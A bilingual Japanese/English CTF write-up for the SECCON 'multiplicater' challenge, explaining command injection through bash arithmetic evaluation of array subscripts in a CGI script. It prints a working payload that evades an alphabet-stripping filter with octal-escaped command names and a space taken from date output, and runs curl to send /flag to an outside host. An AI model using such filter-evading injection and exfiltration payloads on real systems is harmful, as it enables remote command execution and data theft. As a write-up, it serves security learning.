問題名:SECCON_multiplicater

■問題文・ヒント

なし。
index.cgiを添付

■　解法

これを入力するとraintrees.netにフラグが飛んでいきます。
___[$(__=$($'\144\141\164\145');__=${__:3:1};$'\143\165\162\154'${__}$'\150\164\164\160\163'://$'\162\141\151\156\164\162\145\145\163\56\156\145\164'/$($'\143\141\164'${__}/$'\146\154\141\147')>&2)]


変数を数値型で宣言してしまうと、任意のコマンドを実行できてしまう(仕様)
x[$(logger test>&2)]

そのため、以下のようなコマンドを実行すればフラグが取得できる
x[$(curl https://raintrees.net/$(cat /flag)>&2)]

ただし、今回のWebサーバでは、以下を考慮する必要がある

1.validation処理によりアルファベットが削除される
2.URLエンコーディングによりスペースが"+"に変換される

1.validation処理によりアルファベットが削除される
　これは8進数のアスキーコード表現により回避できる。
　例を上げるとdateコマンドは以下で実行できる。
　$'\144\141\164\145'

2.URLエンコーディングによりスペースが"+"に変換される については、以下の対応をする
 __=$'\040';

 ※過去事例として$IFSをスペースの代替とする方法があるが、今回はvalidation処理により利用できない

 ※余談ですが、dateコマンドからスペースを得る手法もあります(だいぶ冗長ですが)
 __=$(date)
 echo $__
 Sun Sep 8 15:18:39 JST 2019
 echo "[${__:3:1}]" # dateコマンドの出力結果の3文字目からスペースを取得する
 [ ]

 "1."の対応と合わせると以下のコードとなる
 __=$($'\144\141\164\145');__=${__:3:1};


# en
Challente title:SECCON_multiplicater

■Challenge text / hint

None.
attach index.cgi


■　solution

If you enter this, the flag will fly to raintrees.net.
___[$(__=$($'\144\141\164\145');__=${__:3:1};$'\143\165\162\154'${__}$'\150\164\164\160\163'://$'\162\141\151\156\164\162\145\145\163\56\156\145\164'/$($'\143\141\164'${__}/$'\146\154\141\147')>&2)]


If you declare a variable as a numeric type, you can execute any command (specification)
x[$(logger test>&2)]

Therefore, the flag can be obtained by executing the following command
x[$(curl https://raintrees.net/$(cat /flag)>&2)]

However, in this Web server, it is necessary to consider the following

1.The alphabet is deleted by the validation process
2.Space is converted to "+" by URL encoding

1.The alphabet is deleted by the validation process
　This can be avoided by octal ASCII code representation.
  For example, the date command can be executed as follows.
　$'\144\141\164\145'

2.For spaces converted to "+" by URL encoding, take the following measures
 __=$'\040';

 ※There is a method of using $ IFS as a substitute for space as a past case, but this time it can not be used due to validation processing

 ※As an aside, there is also a method to get space from the date command (although it is quite redundant)
 __=$(date)
 echo $__
 Sun Sep 8 15:18:39 JST 2019
 echo "[${__:3:1}]" #  Get a space from the third character in the output of the date command
 [ ]

 Combined with "1.", it becomes the following code
 __=$($'\144\141\164\145');__=${__:3:1};
